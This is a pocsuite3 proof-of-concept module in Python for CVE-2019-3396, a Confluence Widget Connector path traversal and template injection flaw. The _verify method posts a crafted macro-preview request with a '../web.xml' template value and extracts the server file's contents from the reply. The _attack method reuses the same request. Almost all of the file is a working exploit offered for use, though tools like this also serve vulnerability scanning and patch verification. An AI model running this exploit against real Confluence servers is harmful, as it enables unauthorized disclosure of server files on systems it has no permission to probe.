import re

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE


class DemoPOC(POCBase):
    vulID = '97898'  # ssvid
    version = '1.0'
    author = ['w7ay']
    vulDate = '2019-04-04'
    createDate = '2019-04-04'
    updateDate = '2019-04-04'
    references = ['https://www.seebug.org/vuldb/ssvid-97898']
    name = 'Confluence Widget Connector path traversal (CVE-2019-3396)'
    appPowerLink = ''
    appName = 'Confluence'
    appVersion = ''
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''2019 年 3 月 28 日，Confluence 官方发布预警 ，指出 Confluence Server 与 Confluence Data Center 中的 Widget Connector 存在服务端模板注入漏洞，攻击 者能利用此漏洞能够实现目录穿越与远程代码执行，同时该漏洞被赋予编号 CVE2019-3396。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        filename = "../web.xml"
        limitSize = 1000

        paylaod = self.url + "/rest/tinymce/1/macro/preview"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Referer": self.url + "/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
            "Content-Type": "application/json; charset=utf-8"
        }
        data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}' % filename
        r = requests.post(paylaod, data=data, headers=headers)

        if r.status_code == 200 and "</web-app>" in r.text:
            m = re.search('<web-app[\s\S]+<\/web-app>', r.text)
            if m:
                content = m.group()[:limitSize]
                result['FileInfo'] = {}
                result['FileInfo']['Filename'] = filename
                result['FileInfo']['Content'] = content

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
